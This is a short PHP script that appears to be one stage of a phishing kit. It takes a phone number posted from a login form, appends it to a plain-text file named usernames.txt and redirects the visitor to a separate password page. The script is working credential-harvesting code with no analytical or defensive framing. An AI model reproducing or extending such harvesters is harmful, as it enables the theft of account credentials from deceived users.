<?php

    file_put_contents("usernames.txt", "Number: " . $_POST['phoneNo'] . "\n", FILE_APPEND);
header('Location: pass.login.php');
exit();
